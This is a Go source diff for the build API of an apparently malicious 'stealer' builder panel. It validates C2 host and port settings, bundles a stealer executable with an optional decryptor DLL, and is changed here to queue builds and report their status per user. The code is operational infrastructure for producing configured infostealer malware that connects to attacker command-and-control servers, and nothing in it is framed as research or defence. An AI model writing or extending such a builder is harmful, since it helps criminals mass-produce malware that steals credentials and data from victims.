@@ -3,7 +3,6 @@ package api
 import (
 	"crypto/sha256"
 	"database/sql"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -50,50 +49,62 @@ func (h *BuildHandler) Build(w http.ResponseWriter, r *http.Request) {
 		writeError(w, http.StatusBadRequest, "c2_host and c2_port are required")
 		return
 	}
-
 	if len(config.C2Host) > 256 {
 		writeError(w, http.StatusBadRequest, "c2_host must be 256 characters or fewer")
 		return
 	}
-
 	if config.C2Port < 1 || config.C2Port > 65535 {
 		writeError(w, http.StatusBadRequest, "c2_port must be between 1 and 65535")
 		return
 	}
 
-	var decryptor []byte
-	if config.IncludeDecryptor && len(h.decryptorDll) > 0 {
-		decryptor = h.decryptorDll
-	}
-
-	built, err := h.service.Build(h.stealerExe, decryptor, config)
-	if err != nil {
-		writeError(w, http.StatusInternalServerError, err.Error())
-		return
-	}
-
 	configJSON, _ := json.Marshal(config)
 	configHash := fmt.Sprintf("%x", sha256.Sum256(configJSON))
-	fileHash := sha256.Sum256(built)
-	sha := hex.EncodeToString(fileHash[:])
-
 	modulesJSON, _ := json.Marshal(config.Modules)
 
 	var buildID, createdAt string
-	err = db.QueryRow(h.db, `INSERT INTO builds (config_hash, file_size, file_data, sha256, build_tag, module_config, user_id)
-		VALUES (?, ?, ?, ?, ?, ?, ?) RETURNING id, created_at`,
-		configHash, len(built), built, sha, config.BuildTag, string(modulesJSON), claimsUserID(r)).Scan(&buildID, &createdAt)
+	err := db.QueryRow(h.db, `INSERT INTO builds
+		(config_hash, status, build_name, build_tag, module_config, user_id)
+		VALUES (?, 'queued', ?, ?, ?, ?)
+		RETURNING id, created_at`,
+		configHash, config.BuildName, config.BuildTag, string(modulesJSON), claimsUserID(r),
+	).Scan(&buildID, &createdAt)
 	if err != nil {
-		writeError(w, http.StatusInternalServerError, "failed to store build")
+		writeError(w, http.StatusInternalServerError, "failed to queue build")
 		return
 	}
 
-	writeJSON(w, http.StatusCreated, map[string]any{
+	writeJSON(w, http.StatusAccepted, map[string]any{
 		"id":         buildID,
-		"file_size":  len(built),
-		"sha256":     sha,
+		"status":     "queued",
+		"build_name": config.BuildName,
 		"build_tag":  config.BuildTag,
 		"created_at": createdAt,
+	})
+}
+
+// Status returns the current build status.
+func (h *BuildHandler) Status(w http.ResponseWriter, r *http.Request) {
+	buildID := chi.URLParam(r, "id")
+	if buildID == "" || !safeIDPattern.MatchString(buildID) {
+		writeError(w, http.StatusBadRequest, "invalid build id")
+		return
+	}
+	var status, sha256, errorMsg string
+	var fileSize int
+	err := db.QueryRow(h.db, `SELECT status, COALESCE(sha256,''), file_size, COALESCE(error_message,'')
+		FROM builds WHERE id = ? AND user_id = ?`, buildID, claimsUserID(r),
+	).Scan(&status, &sha256, &fileSize, &errorMsg)
+	if err != nil {
+		writeError(w, http.StatusNotFound, "build not found")
+		return
+	}
+	writeJSON(w, http.StatusOK, map[string]any{
+		"id":       buildID,
+		"status":   status,
+		"sha256":   sha256,
+		"file_size": fileSize,
+		"error":    errorMsg,
 	})
 }
 
